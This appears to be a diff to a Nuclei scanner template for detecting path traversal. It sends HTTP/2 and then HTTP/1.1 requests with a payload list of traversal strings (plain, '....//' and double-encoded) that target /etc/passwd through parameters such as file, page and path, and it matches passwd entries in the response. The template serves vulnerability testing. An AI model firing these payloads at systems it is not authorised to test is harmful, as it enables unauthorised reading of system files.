@@ -1,21 +1,23 @@
-id: template-id
+id: Path-Traversal-HTTP2-HTTP11
 
 info:
-  name: Template Name
+  name: Path Traversal (HTTP/2 -> HTTP/1.1)
   author: chitowebster
   severity: medium
-  description: description
+  description: Path traversal vulnerability checking HTTP/2 first, then HTTP/1.1
   reference:
     - https://
-  tags: tags
+  tags: path-traversal
 
 http:
+  # Primera solicitud: HTTP/2
   - raw:
       - |+
         GET /image?filename={{param}} HTTP/2
         Host: {{Hostname}}
+        User-Agent: nuclei
+        Accept: */*
         
-
     attack: batteringram
     payloads:
       param:
@@ -71,3 +73,83 @@ http:
           - "gnats:x:41:41"
           - "nobody:x:65534:65534"
         part: all
+
+  # Segunda solicitud: HTTP/1.1 (fallback si falla HTTP/2)
+  - method: GET
+    path:
+      - "{{BaseURL}}{{param}}"
+      - "{{BaseURL}}?{{param}}"
+        
+    attack: batteringram
+    payloads:
+      param:
+        - "page=/etc/passwd"
+        - "filename=/etc/passwd"
+        - "file=/etc/passwd"
+        - "path=/etc/passwd"
+        - "dir=/etc/passwd"
+        - "location=/etc/passwd"
+        - "page=../../../../../../etc/passwd"
+        - "filename=../../../../../../etc/passwd"
+        - "file=../../../../../../etc/passwd"
+        - "path=../../../../../../etc/passwd"
+        - "dir=../../../../../../etc/passwd"
+        - "location=../../../../../../etc/passwd"
+        - "page=....//....//....//etc/passwd"
+        - "filename=....//....//....//etc/passwd"
+        - "file=....//....//....//etc/passwd"
+        - "path=....//....//....//etc/passwd"
+        - "dir=....//....//....//etc/passwd"
+        - "location=....//....//....//etc/passwd"
+        - "page=..%252f..%252f..%252fetc/passwd"
+        - "filename=..%252f..%252f..%252fetc/passwd"
+        - "file=..%252f..%252f..%252fetc/passwd"
+        - "path=..%252f..%252f..%252fetc/passwd"
+        - "dir=..%252f..%252f..%252fetc/passwd"
+        - "location=..%252f..%252f..%252fetc/passwd"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0"
+          - "daemon:x:1:1"
+          - "bin:x:2:2"
+          - "sys:x:3:3"
+          - "sync:x:4:65534"
+          - "games:x:5:60"
+          - "man:x:6:12"
+          - "lp:x:7:7"
+          - "mail:x:8:8"
+          - "news:x:9:9"
+          - "uucp:x:10:10"
+          - "proxy:x:13:13"
+          - "www-data:x:33:33"
+          - "backup:x:34:34"
+          - "list:x:38:38"
+          - "irc:x:39:39"
+          - "gnats:x:41:41"
+          - "nobody:x:65534:65534"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+          - "daemon:x:1:1"
+          - "bin:x:2:2"
+          - "sys:x:3:3"
+          - "sync:x:4:65534"
+          - "games:x:5:60"
+          - "man:x:6:12"
+          - "lp:x:7:7"
+          - "mail:x:8:8"
+          - "news:x:9:9"
+          - "uucp:x:10:10"
+          - "proxy:x:13:13"
+          - "www-data:x:33:33"
+          - "backup:x:34:34"
+          - "list:x:38:38"
+          - "irc:x:39:39"
+          - "gnats:x:41:41"
+          - "nobody:x:65534:65534"
